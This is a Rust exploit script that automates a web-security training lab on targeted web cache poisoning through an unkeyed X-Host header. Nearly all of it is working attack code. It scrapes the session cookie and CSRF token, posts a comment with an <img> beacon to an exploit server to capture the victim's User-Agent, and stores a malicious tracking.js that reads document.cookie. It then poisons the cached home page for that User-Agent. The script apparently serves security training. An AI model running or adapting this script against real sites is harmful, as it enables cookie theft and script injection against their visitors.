/****************************************************************************
*
* Lab: Targeted web cache poisoning using an unknown header
*
* Hack Steps:
*      1. Fetch a post page
*      2. Extract the session cookie and the csrf token to post a comment
*      3. Post a comment with a payload to get the User Agent of the victim
*      4. Wait until the victim view comments to extract their User-Agent
*         from server logs
*      5. Store the malicious javascript file on your exploit server
*      6. Poison the main page for specific subset of users
*
*****************************************************************************/
use lazy_static::lazy_static;
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a58004e04fd8168849ab48e000500e4.h1-web-security-academy.net";

// Change this to your exploit server DOMAIN
const EXPLOIT_SERVER_DOMAIN: &str = "exploit-0a4800b2047e81ed8428b377016b00c5.exploit-server.net";

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("⦗1⦘ Fetching a post page.. ");
    flush_terminal();

    let post_page = fetch(&format!("{LAB_URL}/post?postId=1"));

    println!("{}", "OK".green());
    print!("⦗2⦘ Extracting the session cookie and the csrf token to post a comment.. ");
    flush_terminal();

    let session = get_session_cookie(&post_page);
    let csrf_token = get_csrf_token(post_page);

    println!("{}", "OK".green());
    print!("⦗3⦘ Posting a comment with a payload to get the User Agent of the victim.. ");
    flush_terminal();

    let payload = format!("<img src=https://{EXPLOIT_SERVER_DOMAIN}>");
    post_comment_with_payload(&payload, &session, &csrf_token);

    println!("{}", "OK".green());
    print!(
        "⦗4⦘ Waiting until the victim view comments to extract their User-Agent from server logs.. "
    );
    flush_terminal();

    let user_agent = extract_user_agent_from_logs();

    println!("{}", "OK".green());
    print!("⦗5⦘ Storing the malicious javascript file on your exploit server.. ");
    flush_terminal();

    store_javascript_file_on_exploit_server();

    println!("{}", "OK".green());
    println!("❯❯ Victim's User-Agent: {}", user_agent.yellow());

    // send multiple request to cache the request
    // 10 is enough
    for i in 1..=10 {
        print!("\r⦗6⦘ Poisoning the main page for specific subset of users ({i}/10).. ");
        flush_terminal();

        poison_main_page(&user_agent);
    }

    println!("{}", "OK".green());
    println!("🗹 The main page is poisoned successfully");
    println!("🗹 The lab may not be marked as solved automatically for unknown reasons");
    println!("🗹 Use the User-Agent string with burp if so")
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::default())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
fn fetch(url: &str) -> Response {
    WEB_CLIENT
        .get(url)
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", url.red()))
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*); Secure", cookie_header)
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

fn get_csrf_token(response: Response) -> String {
    let document = Document::from(response.text().unwrap().as_str());
    document
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
        .expect(&format!("{}", "⦗!⦘ Failed to get the csrf".red()))
        .to_string()
}

fn post_comment_with_payload(payload: &str, session: &str, csrf_token: &str) -> Response {
    WEB_CLIENT
        .post(format!("{LAB_URL}/post/comment"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("postId", "1"),
            ("comment", payload),
            ("name", "hacker"),
            ("email", "hacked@you.com"),
            ("csrf", csrf_token),
        ]))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to post a comment".red()))
}

fn extract_user_agent_from_logs() -> String {
    let regex = Regex::new("(Mozilla/5.*Victim.*)&quot;").unwrap();

    loop {
        let log_page = fetch(&format!("https://{EXPLOIT_SERVER_DOMAIN}/log"));
        let logs = log_page.text().unwrap();
        let captures = regex.captures(&logs);

        if let Some(result) = captures {
            let user_agent = result.get(1).unwrap().as_str().to_string();
            return user_agent;
        }
    }
}

fn store_javascript_file_on_exploit_server() {
    let response_head = "HTTP/1.1 200 OK\r\nContent-Type: application/javascript; charset=utf-8";
    let js_file = "alert(document.cookie);";

    WEB_CLIENT
        .post(format!("https://{EXPLOIT_SERVER_DOMAIN}"))
        .form(&HashMap::from([
            ("formAction", "STORE"),
            ("urlIsHttps", "on"),
            ("responseFile", "/resources/js/tracking.js"),
            ("responseHead", response_head),
            ("responseBody", js_file),
        ]))
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to store the malicious javascript file on your exploit server".red()
        ));
}

fn poison_main_page(user_agent: &str) -> Response {
    WEB_CLIENT
        .get(LAB_URL)
        .header("X-Host", EXPLOIT_SERVER_DOMAIN)
        .header("User-Agent", user_agent)
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to fetch the main page with the injected payload".red()
        ))
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
